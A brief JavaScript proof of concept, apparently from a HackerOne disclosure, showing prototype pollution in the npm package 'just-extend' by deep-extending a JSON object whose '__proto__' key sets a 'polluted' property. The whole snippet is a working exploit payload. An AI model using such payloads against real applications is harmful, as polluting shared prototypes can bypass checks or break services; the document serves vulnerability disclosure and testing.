//https://hackerone.com/reports/430291
    const extend = require('just-extend');

    let obj = {}

    let payload2 = JSON.parse('{"__proto__": {"polluted": "yes"}}');
    extend(true, {}, payload2);
